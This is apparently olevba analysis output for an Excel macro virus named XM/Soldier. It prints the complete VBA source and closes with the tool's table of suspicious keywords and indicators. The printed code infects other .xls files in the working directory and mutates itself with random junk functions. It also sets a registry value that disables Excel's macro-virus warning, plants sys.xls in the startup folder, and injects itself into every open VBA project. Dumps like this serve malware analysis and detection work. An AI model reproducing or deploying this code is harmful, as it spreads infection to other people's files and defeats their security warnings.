olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MTXNRTQODXXSYQCG.bas 
in file: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c - OLE stream: '_VBA_PROJECT_CUR/VBA/MTXNRTQODXXSYQCG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function jsplurhsady()
Attribute jsplurhsady.VB_ProcData.VB_Invoke_Func = " \n14"
'zAel&<<,A!dIzqJd|AN5l
End Function
Function giuupchqpordf()
Attribute giuupchqpordf.VB_ProcData.VB_Invoke_Func = " \n14"
Dim gynxapc
Dim mgkpmhmdaqylbvl
Dim xmcmxfixlhelccdt
Dim ckjx
'Lk1
'!ygw
Dim uxclq
Dim lw
Dim unpexqvrv
Dim sffiwxooh
End Function
'kG2/h/:2+}<mDyKR|=5y
'$}!lRw4DO07770k/%C[\w%v}
'SlSGP:3Hb23Lj\)DM
'&5{6E_R*;cK@m`-
'7BOfOO\!|M_6S<xOigA-Pv$j
'_%A%=wX"XdOY-Dpl%G]uM4@wIP4
't23I,=dO
Function btsdydqprndofg()
Attribute btsdydqprndofg.VB_ProcData.VB_Invoke_Func = " \n14"
'AgMGQnc[B.R)Go,T
Dim snnont
Dim kqp
Dim dijuqwihmcdd
Dim xk
Dim xpeimoacmqjmicl
'}m:7ctS8Wr(F$|WdpMQrpI"
Dim xamq
Dim busposbvkkmeq
Dim kr
Dim najakbmkeehogmy
Dim okvtpxnaeuojd
Dim mafcvpqlg
End Function

Function lcrdymnn()
Attribute lcrdymnn.VB_ProcData.VB_Invoke_Func = " \n14"
'SAv0h
End Function
Function yivkhdkutsws()
Attribute yivkhdkutsws.VB_ProcData.VB_Invoke_Func = " \n14"
'2%`r!^t@Nk&A1nt@&
Dim tusvek
End Function
'b4R8KEuY5qHPD&&(B8Aq
'75&\:168>a#&J

'XM/Soldier by Lord Natas [Codebreakers]
'Huge thanks to VicodinES
'Dedicated to all soldiers
'Who gave their lives
'To make ours better

Function Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Hide").Delete
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Unhide...").Delete
End Function

Function Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    Application.EnableCancelKey = xlDisabled
    Randomize
    If Asc(UCase$(Left$(CurDir$(), 1))) < 67 Then GoTo e
    fn$ = Dir("*.xls")
    w$ = ActiveWorkbook.Name
    b = ActiveWorkbook.Saved
    Do While fn$ <> ""
        If UCase$(fn$) <> UCase$(ActiveWorkbook.Name) And Rnd() > 0.25 Then
            a = 0
            Workbooks.Open fn$
            If Workbooks(fn$).Modules.Count <> 0 Then GoTo c
            Randomize
            r$ = ""
            For i = 1 To Int(Rnd() * 15) + 2
                r$ = r$ + Chr$(Int(Rnd() * (90 - 65) + 65))
            Next
            Workbooks(w$).Sheets(1).Copy Before:=Workbooks(fn$).Sheets(1)
            Randomize
            If Rnd() < 0.5 Then
                Poly
                If Rnd() > Rnd() Then
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___", Merge:=True
                Else
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___"
                End If
                Kill "c:\soldier.___"
            End If
            Workbooks(fn$).Sheets(1).Name = r$
            Workbooks(fn$).Sheets(1).Visible = 0
            Workbooks(fn$).Save
c:
            Workbooks(fn$).Close
    End If
    fn$ = Dir()
    Loop
e:
    If ActiveWorkbook.Saved <> b Then ActiveWorkbook.Saved = b
    Randomize
    If Int(Rnd() * 75) = 25 Then
        Application.ScreenUpdating = True
        d$ = "Microsoft Excel"
        For i = 1 To 103
            d$ = " " & d$
            Application.Caption = d$
            Delay
        Next i
        For i = 103 To 1 Step -1
            d$ = Right$(d$, (Len(d$) - 1))
            Application.Caption = d$
            Delay
        Next
    End If
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
End Function

Function Delay()
Attribute Delay.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    For j = 1 To 40000
    Next j
End Function

Function Poly()
Attribute Poly.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Randomize
    For k = 1 To Int(Rnd() * 5) + 1
        Open "c:\soldier.___" For Append As #1
        m = Int(Rnd() * 3)
        Randomize
        Select Case m
        Case 0
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 2
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                Randomize
                If Rnd() > Rnd() Then
                    For z = 1 To Int(Rnd() * 24) + 1
                        ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                    Next z
                    Print #1, Chr$(39) & ab$
                Else
                    Randomize
                    For x = 1 To Int(Rnd() * 5) + 1
                        ab$ = ""
                        Randomize
                        For z = 1 To Int(Rnd() * 15) + 2
                            ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                        Next z
                        Print #1, "Dim " & ab$
                    Next x
                End If
            Next y
            Print #1, "End Function"
        Case 1
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                For z = 1 To Int(Rnd() * 30) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                Next z
                Print #1, Chr$(39) & ab$
            Next y
        Case 2
            Randomize
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 1
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 4) + 1
                ab$ = ""
                Randomize
                For z = 1 To Int(Rnd() * 15) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                Next z
                Print #1, ab$ & " =" & Str$(Int(Rnd() * 30000) + 1)
            Next y
            Print #1, "End Function"
        End Select
        Close #1
    Next k
End Function
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text 'FRIEND
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpSubKey As _
String, ByVal ulOptions As Long, ByVal samDesired As _
Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpValueName As _
String, ByVal Reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" _
(ByVal hKey As Long) As Long
Const HKEY_CURRENT_USER = &H80000001
Const KEY_ALL_ACCESS = &H3F
Const lngData As Long = 0
Const REG_DWORD As Long = 4
Private Sub Workbook_Activate()
Infect
End Sub
Function Infect()
On Error GoTo xnctsg
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Exit Function
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Function
Private Sub Workbook_Open()
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
Application.DisplayAlerts = False
Application.ScreenUpdating = False
For Each wbxxc In Workbooks
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name <> "sys.xls" Then
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
End If
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name = "sys.xls" Then GoTo 99
Next wbxxc
Application.Workbooks.Add
ActiveWorkbook.SaveAs (Application.StartupPath & "\sys.xls")
ActiveWindow.Visible = True
99 On Error GoTo xnctsg
If ThisWorkbook.Name = "sys.xls" Then
Application.Workbooks.Add
End If
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Application.Workbooks("sys.xls").Close savechanges:=True
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
If ThisWorkbook.Name = "sys.xls" Then Exit Sub
Infect
End Sub

























-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Soldier-b66ecced686311703418c3698a9109cf36568b7c - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     24 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  MTXNRTQODXXSYQC
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+
